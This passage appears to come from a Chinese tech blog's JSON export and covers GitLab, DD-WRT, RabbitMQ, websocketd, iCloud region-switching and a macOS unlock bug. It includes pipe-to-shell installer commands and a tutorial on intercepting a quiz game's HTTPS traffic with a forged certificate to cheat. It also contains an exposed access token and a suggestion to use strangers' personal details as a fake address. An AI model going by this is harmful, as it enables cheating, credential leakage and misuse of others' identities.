&lt;groupId&gt;com.git.app&lt;/groupId&gt; &lt;artifactId&gt;my-app-simple&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;my-app-simple&lt;/name&gt; &lt;url&gt;http://maven.apache.org&lt;/url&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.eclipse.jgit&lt;/groupId&gt; &lt;artifactId&gt;org.eclipse.jgit&lt;/artifactId&gt; &lt;version&gt;4.8.0.201706111038-r&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt;编辑完保存后工程会自动其下载对应的架包到当前工程","categories":[],"tags":[]},{"title":"网易云绑定 gitlab","slug":"网易云绑定gitlab","date":"2018-01-23T05:16:35.000Z","updated":"2021-02-26T06:05:29.352Z","comments":true,"path":"posts/63655.html","link":"","permalink":"https://awen.me/posts/63655.html","excerpt":"网易云绑定 gitlab1.设置token","text":"网易云绑定 gitlab1.设置token 2.网易云创建仓库绑定gitlab账户 3.验证成功后关联即可 4.关联后即可看到对应账户下的项目 5.上传一个 Dockerfile 文件测试构建 注：自建gitlab 需要加白名单才可以。","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://awen.me/tags/git/"}]},{"title":"使用 gitlab","slug":"使用-gitlab","date":"2018-01-23T01:50:25.000Z","updated":"2021-02-26T06:05:29.305Z","comments":true,"path":"posts/671.html","link":"","permalink":"https://awen.me/posts/671.html","excerpt":"什么是gitlabgithub 大家应该都知道了，那么很多企业内部的一些源码放github 是不合适的，所以需要内部搭建仓库，本文主要讲解如何在centos 7 上搭建 Gitlab ce 版。 要求要求：4G以上内存服务器，2G 实测卡的不行","text":"什么是gitlabgithub 大家应该都知道了，那么很多企业内部的一些源码放github 是不合适的，所以需要内部搭建仓库，本文主要讲解如何在centos 7 上搭建 Gitlab ce 版。 要求要求：4G以上内存服务器，2G 实测卡的不行 安装1.创建源，这里使用国内源，速度会快很多。 curl -sS http://packages.gitlab.cc/install/gitlab-ce/script.rpm.sh | sudo bash2.安装 yum install gitlab-ce 安装结果 3.初始化 gitlab-ctl reconfigure 这里执行命令后会进行系统初始化，初始化完成后gitlab服务就已经完成了，如果没有特殊需求就已经可以使用了。默认GitLab 是安装到/opt/gitlab 目录，配置文件在/etc/gitlab/下 证书1.证书申请参考 使用验证DNS的方式申请证书 2.创建目录 [root@gitlab1 ~]# cd /etc/gitlab/ [root@gitlab1 gitlab]# mkdir ssl [root@gitlab1 gitlab]# cd ssl/ [root@gitlab1 ssl]# vim gitlab.cer [root@gitlab1 ssl]# vim gitlab.key [root@gitlab1 ssl]# ls gitlab.cer gitlab.key 配置修改 vim /etc/gitlab/gitlab.rb external_url &apos;https://git.v5linux.com&apos; 为你的域名修改 nginx[&apos;redirect_http_to_https&apos;]=true nginx[&apos;ssl_certificate&apos;] = &quot;/etc/gitlab/ssl/gitlab.pem&quot; nginx[&apos;ssl_certificate_key&apos;] = &quot;/etc/gitlab/ssl/gitlab.key&quot;更新配置 [root@gitlab ~] gitlab-ctl reconfigure邮件配置因为现在很多运营商或 IDC 都默认把 25端口封了，用 postfix 无法发送 Email，所以我们直接使用配置文件的 smtp 来发信 1.编辑配置文件，找到如下配置段 gitlab_rails[&apos;smtp_enable&apos;] = true gitlab_rails[&apos;smtp_address&apos;] = &quot;smtp.server&quot; gitlab_rails[&apos;smtp_port&apos;] = 465 gitlab_rails[&apos;smtp_user_name&apos;] = &quot;smtp user&quot; gitlab_rails[&apos;smtp_password&apos;] = &quot;smtp password&quot; gitlab_rails[&apos;smtp_domain&apos;] = &quot;example.com&quot; gitlab_rails[&apos;smtp_authentication&apos;] = &quot;login&quot; gitlab_rails[&apos;smtp_enable_starttls_auto&apos;] = true gitlab_rails[&apos;smtp_tls&apos;] = false 修改为 gitlab_rails[&apos;smtp_enable&apos;] = true gitlab_rails[&apos;smtp_address&apos;] = &quot;smtp.163.com&quot; gitlab_rails[&apos;smtp_port&apos;] = 465 gitlab_rails[&apos;smtp_user_name&apos;] = &quot;hsweib@163.com&quot; gitlab_rails[&apos;smtp_password&apos;] = &quot;password&quot; gitlab_rails[&apos;smtp_domain&apos;] = &quot;163.com&quot; gitlab_rails[&apos;smtp_authentication&apos;] = &quot;login&quot; gitlab_rails[&apos;smtp_enable_starttls_auto&apos;] = true gitlab_rails[&apos;gitlab_email_from&apos;] = &quot;hsweib@163.com&quot; user[&quot;git_user_email&quot;] = &quot;hsweib@163.com&quot; gitlab_rails[&apos;smtp_tls&apos;] = true重启 gitlab-ctl restart测试 [root@gitlab ssl]# gitlab-rails console Loading production environment (Rails 4.2.10) irb(main):001:0&gt; Notify.test_email(&apos;hi@awen.me&apos;, &apos;邮件标题&apos;, &apos;邮件正文&apos;).deliver_now 如果出现错误，检查参数是否与我配的一致。 首次访问需要设置root密码，设置完之后使用root 登录 头像设置1.因为最近 Gravatar 被墙，所以关闭 Gravatar 头像 创建用户进入首页，点击Add people 创建用户 新用户登录会发送一封邮件 点击链接设置密码 创建项目1.登录后点击 Create a project 2.设置项目名称和级别 然后就和操作git 一样了 不过前提是我们需要有权限，点击右上角，选择用户–设置 添加一个 SSH key 然后在克隆仓库 添加文件，push 到仓库就可以看到了 安全设置建议开启双因素认证，提高安全性 默认存储位置修改默认安装其目录在 /var/opt/gitlab/git-data/repositories/修改要在配置文件中 vim /etc/gitlab/gitlab.rb # git_data_dirs({ # &quot;default&quot; =&gt; { # &quot;path&quot; =&gt; &quot;/mnt/nfs-01/git-data&quot; # } # })在其下面增加 git_data_dir &quot;/data/gitlab然后重启 gitlab-ctl stop gitlab-ctl reconfigure gitlab-ctl start使用token 方式克隆代码1.gitlab 后台找到 access tokens，创建 token 2.通过 token 方式克隆代码 ➜ Downloads git clone https://gitlab-ci-token:AQq6nQvpP93LDmSzfUFm@git.v5linux.com/wenjun.fang/my-project.git Cloning into &apos;my-project&apos;... remote: Counting objects: 19, done. remote: Compressing objects: 100% (14/14), done. remote: Total 19 (delta 2), reused 0 (delta 0) Unpacking objects: 100% (19/19), done.日志gitlab 的日志都在 /var/log/gitlab 目录下 [root@gitlab gitlab]# pwd /var/log/gitlab [root@gitlab gitlab]# gitlab-ctl tail -f nginx/gitlab_access.log","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://awen.me/tags/git/"}]},{"title":"使用 ddwrt","slug":"使用-ddwrt","date":"2018-01-19T14:25:34.000Z","updated":"2021-02-26T06:05:29.304Z","comments":true,"path":"posts/56346.html","link":"","permalink":"https://awen.me/posts/56346.html","excerpt":"一开始想刷个openwrt，但是因为我的华硕 rt-ac66u 是mpls 架构的，openwrt 的固件只支持2.4G，所以我刷了 ddwrt","text":"一开始想刷个openwrt，但是因为我的华硕 rt-ac66u 是mpls 架构的，openwrt 的固件只支持2.4G，所以我刷了 ddwrt ddwrt 和openwrt 一样也是开源的路由器系统。 开源的优势和其他开源软件一样，比如 Linux 就是非常著名的开源操作系统(一些中大型企业的数据中心(IDC)中跑的各种服务其服务器都是采用开源的 Linux 操作系统作为服务器或存储)，而一些开源的路由器固件，包括 ddwrt 也都是从 Linux 的基础上进行修改而来的，开源的优势: 1.相对安全，没有后门；因为其源码都是公开的，如果你买的路由器是类似小米路由或极路由这种，其底层也是 openwrt 的开源系统，在其之上进行了各种定制化的，但是因为其加入了自己的东西，并且不是开源的，所以假如商家植入了恶意代码你也没办法，比如之前就有报道小米路由器的劫持事件。 2.可定制性强；因为是一套开源的方案，如果你懂技术，可以随便折腾，发挥你的想象力去改造你的路由器，而类似一些商业的路由器产品你是无法通过正常手段进入到路由器系统里面的，比如 TP-link 这类，不过一般不建议过重的去改造路由器，毕竟其硬件配置摆在这里，加入了很多内容会导致其性能下降，对于一个路由器而言，其最重要的功能就是提供数据包的转发以及提供无线等相关核心功能。 3.功能丰富；传统的路由器固件只有最基础的功能，而一些开源的路由器系统拥有非常丰富的软件，可以满足更多的需求。 刷固件好了，接下来就是刷机了，刷机很简单，因为我的路由器是 华硕的 RT-ac66u，所以以其作为例子讲解，首先，先下载对应路由器的固件在华硕的后台点击系统设置–固件升级，加载对应版本的ddwrt固件上传后即可，不需要进行任何额外的设置，非常简单。 安装完后会出现一个ddwrt的 ssid 没有密码，连接它，设置下用户名和密码就进入到如图所示的后台了。 配置 ssh1.首先，修改下语言，点击管理-找到语言设置，设置为中文简体 2.此外你也可以调整web控制台的风格 3.切换到服务，设置ssh 保存并应用，然后切换到管理开始 SSH管理，关闭 telnet 管理，因为telnet 是明文传输不安全，端口随便设置一个，尽量不要用默认的。 然后远程登录试试，不出意外可以看到这个界面，说明 SSH 服务开启成功了。 开启jffs创建两个目录 web 控制台切换到 管理，开启 jffs 支持，首次开始要清楚下数据然后重启下路由器看看配置是不是如图所示 SSH 远程进入命令行界面，执行 mkdir /jffs/ 然后控制台切换到服务-USB 开启自动挂载 安装 opkg返回命令行，安装opkg，类似centos的yum 或ubuntu apt-get，我这里是mpls 架构 所以执行 wget -O - http://pkg.entware.net/binaries/mipsel/installer/installer.sh | sh如果你的路由器是arm 架构，则执行 wget -O - http://pkg.entware.net/binaries/armv7/installer/entware_install.sh | sh安装完毕，执行 opkg，可以看到如图所示的命令参数则说明安装成功 然后可以安装软件了，可以安装的软件列表可以在这里查看 如图所示，这是mpls 的仓库，你可以在这里搜索软件 比如安装个 tcpdump 抓包，则执行 opkg install tcpdump安装完毕后就可以用tcpdump 抓包了 升级升级固件可以去这里下载最新的固件来升级 问题1.超频，点击管理，你可以看到超频，建议保持默认，因为我之前用网件刷ddwrt 设置了超频直接就挂了。 更多内容，等你自己摸索，ddwrt 的固件和 openwrt 一样拥有非常多的参数和配置，比如可以配置vpn、stp、url过滤、Qos、CIFS网络文件系统、计划任务等等、关键词过滤、网络唤醒等等。 2.已经刷回原厂了，这套系统进入控制台都特别的卡，无线会经常重连。","categories":[],"tags":[]},{"title":"Java  中进行base64 编码和解码","slug":"Java-中进行base64-编码和解码","date":"2018-01-19T07:48:25.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/60188.html","link":"","permalink":"https://awen.me/posts/60188.html","excerpt":"依赖相关架包需要去这里下载","text":"依赖相关架包需要去这里下载 下载后导入到项目中 代码 import org.apache.commons.codec.binary.Base64; public class Base64Demo { public static void main(String[] args) { String str = &quot;{\\&quot;Bucket\\&quot;:\\&quot;doc\\&quot;,\\&quot;Object\\&quot;:\\&quot;anne.jpg\\&quot;,\\&quot;Expires\\&quot;:1451491200}&quot;; String baseencode = new String(Base64.encodeBase64(str.toString().getBytes())); System.out.println(baseencode);//编码得到 eyJCdWNrZXQiOiJkb2MiLCJPYmplY3QiOiJhbm5lLmpwZyIsIkV4cGlyZXMiOjE0NTE0OTEyMDB9 String basedecode = new String(Base64.decodeBase64(baseencode.toString().getBytes())); System.out.println(basedecode);//解码后得到{&quot;Bucket&quot;:&quot;doc&quot;,&quot;Object&quot;:&quot;anne.jpg&quot;,&quot;Expires&quot;:1451491200} } }","categories":[],"tags":[]},{"title":"使用WebSocketd 测试websocket协议","slug":"使用WebSocketd-测试websocket协议","date":"2018-01-19T01:54:48.000Z","updated":"2021-02-26T06:05:29.308Z","comments":true,"path":"posts/40121.html","link":"","permalink":"https://awen.me/posts/40121.html","excerpt":"什么是 Websocket传统的 http 协议通信只能由客户端发起,并且它是一个单向请求，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用”轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。","text":"什么是 Websocket传统的 http 协议通信只能由客户端发起,并且它是一个单向请求，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用”轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。 轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。 WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。 它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。 其他特点包括： 建立在 TCP 协议之上，服务器端的实现比较容易。 与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。 数据格式比较轻量，性能开销小，通信高效。 可以发送文本，也可以发送二进制数据。 没有同源限制，客户端可以与任意服务器通信。 协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。 如: ws://example.com:80/some/pathwebsocket 客户端 API参考 developer.mozilla.org websocketdWebSocket 服务器 Websocketd 最大特点，就是后台脚本不限语言，标准输入（stdin）就是 WebSocket 的输入，标准输出（stdout）就是 WebSocket 的输出。 下载点击这里下载 解压[root@centos ~]# ls counter.sh websocketd-0.3.0-linux_amd64.zip [root@centos ~]# unzip websocketd-0.3.0-linux_amd64创建一个连接1.先准备一个脚本 [root@centos ~]# cat counter.sh #!/bin/bash echo 1 sleep 1 echo 2 sleep 1 echo 3 2.设置监听端口并执行脚本 [root@centos ~]# ./websocketd --port=80 bash ./counter.sh客户端&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; var ws = new WebSocket(&apos;ws://59.111.110.90:80/&apos;); ws.onmessage = function(event) { console.log(event.data); }; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt;刷新页面在console 中会打印 服务端Fri, 19 Jan 2018 09:43:14 +0800 | INFO | server | | Serving using application : /usr/bin/bash ./counter.sh Fri, 19 Jan 2018 09:43:14 +0800 | INFO | server | | Starting WebSocket server : ws://centos.novalocal:80/ Fri, 19 Jan 2018 09:46:08 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326368262661241&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; | CONNECT Fri, 19 Jan 2018 09:46:10 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326368262661241&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; pid:&apos;948&apos; | DISCONNECT Fri, 19 Jan 2018 09:46:17 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326377566650836&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; | CONNECT Fri, 19 Jan 2018 09:46:19 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326377566650836&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; pid:&apos;955&apos; | DISCONNECT Fri, 19 Jan 2018 09:49:51 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326591176543193&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; | CONNECT Fri, 19 Jan 2018 09:49:53 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326591176543193&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; pid:&apos;1002&apos; | DISCONNECT Fri, 19 Jan 2018 09:49:56 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326596164276971&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; | CONNECT Fri, 19 Jan 2018 09:49:58 +0800 | ACCESS | session | url:&apos;http://59.111.110.90/&apos; id:&apos;1516326596164276971&apos; remote:&apos;10.173.32.233&apos; command:&apos;/usr/bin/bash&apos; origin:&apos;file://&apos; pid:&apos;1007&apos; | DISCONNECT","categories":[],"tags":[]},{"title":"消息队列服务 RabbitMQ","slug":"消息队列服务-RabbitMQ","date":"2018-01-18T07:30:47.000Z","updated":"2021-02-26T06:05:29.345Z","comments":true,"path":"posts/43833.html","link":"","permalink":"https://awen.me/posts/43833.html","excerpt":"Rabbitmq是一个消息代理。它的核心思想非常简单：接收并转发消息。你可以把它想象成一个邮局：当你把邮件丢进邮箱时，你非常确定邮递员先生会把它送到收件人手中。在这个比喻中，RabbitMQ就是邮箱、邮局和邮递员。 RabbitMQ和邮局的主要区别是它处理的不是纸张。它接收、存储并转发二进制数据块，也就是message，消息。","text":"Rabbitmq是一个消息代理。它的核心思想非常简单：接收并转发消息。你可以把它想象成一个邮局：当你把邮件丢进邮箱时，你非常确定邮递员先生会把它送到收件人手中。在这个比喻中，RabbitMQ就是邮箱、邮局和邮递员。 RabbitMQ和邮局的主要区别是它处理的不是纸张。它接收、存储并转发二进制数据块，也就是message，消息。 术语RabbitMQ和消息传递中会用到一些术语： 生产者在现实生活中就好比制造商品的工厂，他们是商品的生产者。生产者只意味着发送。发送消息的程序称之为一个生产者。我们用“P”表示 列队队列就像存放商品的仓库或者商店，是生产商品的工厂和购买商品的用户之间的中转站。队列就像是一个仓库或者流水线。在RabbitMQ中，信息流从你的应用程序出发，来到RabbitMQ的队列，所有信息可以只存储在一个队列中。队列可以存储很多的消息，因为它基本上是一个无限制的缓冲区，前提是你的机器有足够的存储空间。多个生产者可以将消息发送到同一个队列中，多个消费者也可以只从同一个队列接收数据。这就是队列的特性。队列用下面的图表示，图上面是队列的名字： 消费者消费者就好比是从商店购买或从仓库取走商品的人，消费的意思就是接收。消费者是一个程序，主要是等待接收消息。我们的用“C”表示 注意: producer、consumer和消息代理不需要生活在同一台机器上，事实上大多数应用中它们会分开住。 安装#yum -y install epel-release #yum install erlang #先安装 Erlang #rpm --import https://dl.bintray.com/rabbitmq/Keys/rabbitmq-release-signing-key.asc #yum install rabbitmq-server1.设置未开机启动 systemctl enable rabbitmq-server2.启动 systemctl start rabbitmq-server配置端口确保可以打开以下端口： 4369：epmd，RabbitMQ节点和CLI工具使用的对等发现服务5672,5671：由AMQP 0-9-1和1.0客户端使用，没有和使用TLS25672：由Erlang分配用于节点间和CLI工具通信，并且从动态范围（默认情况下限于单个端口，计算为AMQP端口+20000）分配。详情请参阅联网指南。15672：HTTP API客户端和rabbitmqadmin（仅当管理插件启用时）61613,61614：STOMP客户端没有和使用TLS（只有STOMP插件已启用）1883年，8883：（MQTT客户端没有和TLS，如果MQTT插件已启用15674：STOMP-over-WebSockets客户端（仅在启用了Web STOMP插件的情况下）15675：MQTT-over-WebSockets客户端（仅在启用了Web MQTT插件的情况下） 查看状态[root@centos ~]# rabbitmqctl status Status of node rabbit@centos ... [{pid,40209}, {running_applications,[{rabbit,&quot;RabbitMQ&quot;,&quot;3.3.5&quot;}, {mnesia,&quot;MNESIA CXC 138 12&quot;,&quot;4.11&quot;}, {os_mon,&quot;CPO CXC 138 46&quot;,&quot;2.2.14&quot;}, {xmerl,&quot;XML parser&quot;,&quot;1.3.6&quot;}, {sasl,&quot;SASL CXC 138 11&quot;,&quot;2.3.4&quot;}, {stdlib,&quot;ERTS CXC 138 10&quot;,&quot;1.19.4&quot;}, {kernel,&quot;ERTS CXC 138 10&quot;,&quot;2.16.4&quot;}]}, {os,{unix,linux}}, {erlang_version,&quot;Erlang R16B03-1 (erts-5.10.4) [source] [64-bit] [async-threads:30] [hipe] [kernel-poll:true]\\n&quot;}, {memory,[{total,35004392}, {connection_procs,2720}, {queue_procs,5440}, {plugins,0}, {other_proc,13305792}, {mnesia,58336}, {mgmt_db,0}, {msg_index,33936}, {other_ets,781728}, {binary,13344}, {code,16713450}, {atom,602729}, {other_system,3486917}]}, {alarms,[]}, {listeners,[{clustering,25672,&quot;::&quot;},{amqp,5672,&quot;::&quot;}]}, {vm_memory_high_watermark,0.4}, {vm_memory_limit,741048320}, {disk_free_limit,50000000}, {disk_free,18375475200}, {file_descriptors,[{total_limit,924}, {total_used,3}, {sockets_limit,829}, {sockets_used,1}]}, {processes,[{limit,1048576},{used,124}]}, {run_queue,0}, {uptime,326}] ...done. [root@centos ~]#配置文件cp /usr/share/doc/rabbitmq-server-3.3.5/rabbitmq.config.example /etc/rabbitmq/ cp /etc/rabbitmq/rabbitmq.config.example /etc/rabbitmq/rabbitmq.config vim /etc/rabbitmq/rabbitmq.config修改 %%{loopback_users, []},为 {loopback_users, []} 开启web管理插件rabbitmq-plugins enable rabbitmq_management重启 service rabbitmq-server restart开通端口 sudo iptables -I INPUT -p tcp -m tcp –dport 15672 -j ACCEPT sudo iptables -I INPUT -p tcp -m tcp –dport 5672 -j ACCEPT 访问 创建用户[root@centos ~]# rabbitmqctl add_user admin admin Creating user &quot;admin&quot; ... ...done.赋予admin 管理员权限 [root@centos ~]# rabbitmqctl set_user_tags admin administrator Setting tags for user &quot;admin&quot; to [administrator] ... ...done.列出用户 [root@centos ~]# rabbitmqctl list_users Listing users ... admin [administrator] guest [administrator] ...done.登录后界面","categories":[],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://awen.me/tags/rabbitmq/"}]},{"title":"头脑王者的正确打开方式","slug":"头脑王者的正确打开方式","date":"2018-01-16T06:20:51.000Z","updated":"2021-02-26T06:05:29.323Z","comments":true,"path":"posts/13618.html","link":"","permalink":"https://awen.me/posts/13618.html","excerpt":"下载证书可以自己本地搞个代理，参考这里。也可以在服务器上搭建代理 1.下载证书并安装点击这里下载","text":"下载证书可以自己本地搞个代理，参考这里。也可以在服务器上搭建代理 1.下载证书并安装点击这里下载 配置证书2.ios 用户点击设置-关于手机-证书信任中 开启github.com/coreos.goproxy 的信任 配置代理3.打开无线局域网，找到 HTTP 代理-配置代理，选择手动，然后在服务器中填写IP地址和端口，例如 IP 192.168.1.1 端口 8998 开始玩运行 4.杀死微信后重新进入–运行头脑王者小程序 在实际过程中部分答案会有错误 4G网络下可以通过第三方软件配置 http 代理 原理小程序在传输过程中使用 HTTPS 传输数据，而伪造证书后就可以看到其明文数据，如下 请求题目 POST /question/bat/findQuiz HTTP/1.1 { &quot;data&quot;: { &quot;quiz&quot;: &quot;被称为万园之园的建筑是？&quot;, &quot;options&quot;: [&quot;清华园&quot;, &quot;颐和园&quot;, &quot;畅春园&quot;, &quot;圆明园&quot;], &quot;num&quot;: 5, &quot;school&quot;: &quot;文艺&quot;, &quot;type&quot;: &quot;设计&quot;, &quot;contributor&quot;: &quot;知乎&quot;, &quot;endTime&quot;: 1516088162, &quot;curTime&quot;: 1516088147 }, &quot;errcode&quot;: 0 }返回答案 POST /question/bat/choose HTTP/1.1 { &quot;data&quot;: { &quot;uid&quot;: 0, &quot;num&quot;: 5, &quot;answer&quot;: 4, &quot;option&quot;: 0, &quot;yes&quot;: false, &quot;score&quot;: 0, &quot;totalScore&quot;: 100, &quot;rowNum&quot;: 0, &quot;rowMult&quot;: 0, &quot;costTime&quot;: 9, &quot;roomId&quot;: 1082467590, &quot;enemyScore&quot;: 460, &quot;enemyAnswer&quot;: 2 }, &quot;errcode&quot;: 0 }num 表示题目为第五题，其中 answer 就是该题答案 4 表示是题目 options 中的第四个，即圆明园，返回值 yes 为 false 表示答错了 true 表示答对了，roomId 表示房间id 最后5题答案返回 POST /question/bat/fightResult HTTP/1.1 { &quot;data&quot;: { &quot;score&quot;: 100, #得分 &quot;rowNum&quot;: 1, &quot;addGold&quot;: -22,#减去22金币 &quot;addExp&quot;: 1, #经验值+1 &quot;exp&quot;: 1049, &quot;maxExp&quot;: 1979, &quot;level&quot;: 25, &quot;isOut&quot;: false, &quot;isWin&quot;: 2, &quot;rowWinNum&quot;: 0, &quot;rivalScore&quot;: 460, &quot;rivalRowNum&quot;: 2, &quot;rivalIsOut&quot;: false, &quot;itemInfo&quot;: { &quot;itemId&quot;: 0, &quot;itemNum&quot;: 0 }, &quot;groupScore&quot;: 0, &quot;matchID&quot;: 300001, &quot;star&quot;: 0, &quot;winBack&quot;: false }, &quot;errcode&quot;: 0 }那么只需要有足够的题库即可","categories":[],"tags":[]},{"title":"关于 icloud 要将中国地区的数据存储在贵州的一些建议","slug":"如何更改apple-id-到美国","date":"2018-01-13T13:16:49.000Z","updated":"2021-02-26T06:05:29.328Z","comments":true,"path":"posts/20138.html","link":"","permalink":"https://awen.me/posts/20138.html","excerpt":"近日苹果公司宣布，从 2018 年 2 月 28 日起中国内地的 iCloud 服务将转由云上贵州公司负责运营。","text":"近日苹果公司宣布，从 2018 年 2 月 28 日起中国内地的 iCloud 服务将转由云上贵州公司负责运营。 届时，云上贵州公司将拥有与 iCloud 中国内地用户的法律和财务关系，使用这些服务及通过 iCloud 存储的所有数据（包括照片、视频、文稿和备份等）都将受到新的 iCloud（由云上贵州运营）条款与条件的约束。 具体的条款，请参考iCloud（由云上贵州运营）条款与条件 和常见问题 对我们有何影响与之前的 icloud 条款有区别的是 下面这段： 也就是说你上传的任何数据都会受到我国相关的法律法规约束，比如说你保存的一些小电影、或者存储了一些国家觉得不合适的内容都有可能被删掉（小到比如盗版电影、图书、软件）。类似此前百度的 8 秒教育片可能会出现: 另外就是隐私泄漏问题，由于 icloud 可以同步很多的信息，比如你的实时地理位置、密码、网页浏览记录、照片、文档、邮件、日历、备忘录以及一些软件的配置信息、通讯录等等比较隐私的内容，考虑到国内这些个互联网公司的尿性，以及相关法律法规的不完善和个人维权的困难，我非常担心以后会不会出现信息泄漏导致个人数据被黑或者被滥用的情况。现在看来有很多人都有这样的担心： 如何才能防止自己的 iCloud 信息被委托给国内公司？ 我们看下这家云上贵州是个什么公司，从企查查查到 这家公司是由贵州省经济和信息化委员会（中共贵州省委国防工业委员会）100%控股的，公司名称是云上贵州大数据产业发展有限公司。 从名字上看出这是一家具有政府背景的企业，从大的层面来说，数据被泄漏的可能性应该很小，但是被监控是肯定的（其实就算没有苹果也是会被监控的），另外我听到大数据这几个词我就很反感。比如我很反感支付宝把我的消费记录拿来做年度账单，我表示未来会不会用户的私人数据被用来进行各种分析然后进行贩卖，毕竟国内这几年一些大公司的德行大家都看在眼里。 国内这些大企业收集个人信息滥用导致个人信息泄漏、被黑客入侵、贩卖个人资料的事情已经屡见不鲜了。我们每天收到的各种垃圾信息、垃圾电话可以证明这一点。 而存储在icloud 的数据和放百度网盘的数据还是不一样的，通过icloud的数据可以很精准的了解一个人用什么软件、每天去了哪里、停留了多少时间、拍的照片、写的文档、表格、通讯录的常用联系人、最近都和谁通话了、通话时间是多久、发的短信内容等等非常全面的个人信息。 而如果这些信息被利用可以精准的了解一个人，那这些信息会不会被拿来贩卖都是不得而知的。 解决方法停用第一种方法就是停用icloud，适用于对自己的隐私保护非常强烈的人，访问 这里 选择于2018年2月28日起停用 iCloud 登录 icloud 停用，即可在2月28号停用，如果你到时候想继续使用，则需要同意相关条款才可以。 毕竟只要你联网了，你就可能在当下或以后泄漏你的各种数据给各种企业、政党、其他人。 转区本次迁移只针对 icloud 帐号是中国的，如果你的帐号是非中国地区则不受影响，所以我们可以利用苹果的转区功能将国家更改为其他非中国国家则苹果不会将您的数据迁移到贵州 迁移步骤如下： 1.全局代理方式打开（自己想办法）2.使用手机或 ituns 登录帐号，查看账户信息 3.选择更改国家（因为我已经改过了所以界面已经是英文，美区） 4.选择信用卡，如果不开全局代理只有2个选项，信用卡或paypal，开了全局代理会有一个 None选项，然后填写相关资料（比如地址、邮编、电话等等） 提交就可以了。地址信息可以网上搜，比如转美区就搜“美国人信息” 你会找到答案的。 影响1.转区的影响就是 Apple wallet 无法使用，付费软件购买不能使用支付宝和国内visa卡，不过你可以购买苹果礼品卡购买软件。 继续使用如果你不是特别关心隐私方面的（比如觉得我的信息都被国内这些软件搜集的差不多的，比如支付宝、微信、百度、滴滴打车、美团等等看的差不多了，也不差这一点），你完全可以继续使用，本次迁移后可能 icloud 的速度会有所提升。 写在最后其实转区也只是一点心理安慰吧，至少是自己以为数据在国外至少不会被滥用，而放在国内有很大可能性会被滥用而影响日常生活（比如多一些骚扰电话、推销短信等等，至于被监控，哪个国家都有）。另外手机上装那么些国产软件，自己的通讯录都不知道被多少流氓软件读取上传然后被贩卖给其他个人或企业或者被拖库了，指望苹果保护你的隐私说实话有点可笑了。 此外，重要的数据可以本地加密后在备份到云上，参考我之前的文章:加密你的网盘数据，另外要做好备份，我以一个相关行业的从业者身份表示千万别相信你存储的服务商吹牛逼告诉你说什么多重备份，加密数据，如果你相信了，那等万一哪一天你的数据没了，你就追悔莫及了。 此外，帐号一定要开2步验证，不管是用手机接收验证码 还是类似 Google Atuh 之类的工具接受一定要开启，不然被盗用的可能性非常大。","categories":[],"tags":[{"name":"icloud","slug":"icloud","permalink":"https://awen.me/tags/icloud/"}]},{"title":"苹果又出BUG了，不需要输入密码即可解密","slug":"苹果又出BUG了，不需要输入密码即可解决","date":"2018-01-11T02:11:44.000Z","updated":"2021-02-26T06:05:29.355Z","comments":true,"path":"posts/20252.html","link":"","permalink":"https://awen.me/posts/20252.html","excerpt":"1.首先查看系统版本","text":"1.首先查看系统版本 2.打开系统偏好设置，找到 App Store 3.点击解锁 4.不需要输入密码并且用户名可以替换为root 5.直接就解锁了 不过目前看好像不会获取root权限,但是这种问题已经出现过一次了。苹果药丸","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"Letsencrypt 